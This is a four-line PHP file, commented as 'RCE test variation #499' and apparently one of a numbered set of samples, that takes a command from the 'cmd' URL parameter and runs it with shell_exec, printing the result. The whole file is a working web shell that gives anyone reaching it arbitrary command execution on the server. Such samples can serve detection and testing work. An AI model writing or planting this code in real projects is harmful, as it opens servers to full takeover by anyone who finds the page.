<?php
// RCE test variation #499
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>